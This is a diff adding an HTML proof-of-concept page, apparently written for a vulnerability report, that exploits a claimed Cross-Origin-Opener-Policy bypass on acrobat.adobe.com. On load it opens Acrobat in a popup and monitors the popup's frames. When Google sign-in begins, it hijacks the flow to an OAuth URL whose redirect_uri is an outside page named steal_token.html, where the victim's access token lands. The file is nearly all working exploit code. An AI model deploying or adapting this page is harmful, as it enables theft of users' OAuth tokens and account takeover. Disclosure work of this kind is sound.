@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+  <html>
+  <head>
+      <title>COOP Bypass PoC - Adobe Acrobat OAuth Hijack</title>
+      <style>
+          body { font-family: Arial; display: flex; flex-direction: column;
+                 align-items: center; justify-content: center;
+                 min-height: 100vh; background: #1a1a2e; color: white; }
+          .status { background: #16213e; padding: 20px; border-radius: 8px;
+                    margin: 10px; width: 600px; font-size: 13px; }
+          .hit  { color: #00ff88; font-weight: bold; }
+          .miss { color: #ff4444; }
+          button { padding: 15px 30px; background: #e94560; color: white;
+                   border: none; border-radius: 6px; font-size: 16px;
+                   cursor: pointer; margin: 10px; }
+          h2 { color: #e94560; }
+          .label { color: #888; font-size: 11px; }
+      </style>
+      <script>
+      let foo;
+      let oauthDetected = false;
+      let redirectAttempted = false;
+
+      var urlParam = "https://acrobat.adobe.com/?code=bypass_poc";
+
+      var attackOAuthURL = "https://accounts.google.com/o/oauth2/v2/auth" +
+          "?client_id=770783877544-3p0nfvbebbmh2h1r50vuighb1n8e34lu.apps.googleusercontent.com" +
+          "&redirect_uri=https://coop-test03.vercel.app/steal_token.html" +
+          "&response_type=token" +
+          "&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile";
+
+      function log(msg, type) {
+          var el = document.getElementById("log");
+          var line = document.createElement("div");
+          line.className = type || "";
+          line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
+          el.appendChild(line);
+          el.scrollTop = el.scrollHeight;
+      }
+
+      function verifyCOOPBypass() {
+          try {
+              var test = foo.location.href;
+              log("BYPASS CONFIRMED: foo.location accessible = " + test, "hit");
+              return true;
+          } catch(e) {
+              log("foo.location blocked: " + e.message, "miss");
+              return false;
+          }
+      }
+
+      function monitorFrames() {
+          if (!foo || foo.closed || redirectAttempted) return;
+          try {
+              let f = foo.frames.length;
+              log("Frames: " + f);
+              if (f == 2 && !oauthDetected) {
+                  oauthDetected = true;
+                  log("OAuth detected (2 frames)!", "hit");
+              }
+          } catch(e) {
+              log("Cross-origin block detected - OAuth redirect in progress", "hit");
+              if (oauthDetected && !redirectAttempted) {
+                  redirectAttempted = true;
+                  log("Hijacking OAuth flow...", "hit");
+                  setTimeout(() => {
+                      try {
+                          foo.location.replace(attackOAuthURL);
+                          log("Redirect SUCCESS - victim sent to attacker OAuth", "hit");
+                      } catch(e2) {
+                          log("Redirect failed: " + e2.message, "miss");
+                      }
+                  }, 1);
+              }
+          }
+          setTimeout(monitorFrames, 500);
+      }
+
+      function launch() {
+          log("Opening: " + urlParam);
+          foo = window.open(urlParam, "foo", "width=500,height=600");
+          setTimeout(() => {
+              log("Verifying COOP bypass...");
+              var bypassed = verifyCOOPBypass();
+              if (bypassed) {
+                  log("Starting OAuth flow monitor...", "hit");
+                  monitorFrames();
+              }
+          }, 2000);
+      }
+
+      window.onload = launch;
+      </script>
+  </head>
+  <body>
+      <h2>COOP Bypass PoC — Adobe Acrobat OAuth Hijacking</h2>
+      <div class="status">
+          <div class="label">BYPASS MECHANISM</div>
+          <strong>?code=</strong> query param forces <strong>COOP: unsafe-none</strong><br>
+          Confirmed: GET /?code=bypass_poc returns COOP: unsafe-none
+      </div>
+      <button onclick="launch()">Launch Exploit</button>
+      <div class="status" id="log" style="height:250px; overflow-y:auto; font-family:monospace"></div>
+      <div class="status">
+          <div class="label">STEPS TO REPRODUCE</div>
+          1. Click Launch Exploit (auto-launches on load)<br>
+          2. In the Adobe window: Sign in → Continue with Google<br>
+          3. Watch log: BYPASS CONFIRMED then OAuth flow hijacked<br>
+          4. Victim lands on attacker's Google OAuth app
+      </div>
+  </body>
+  </html>
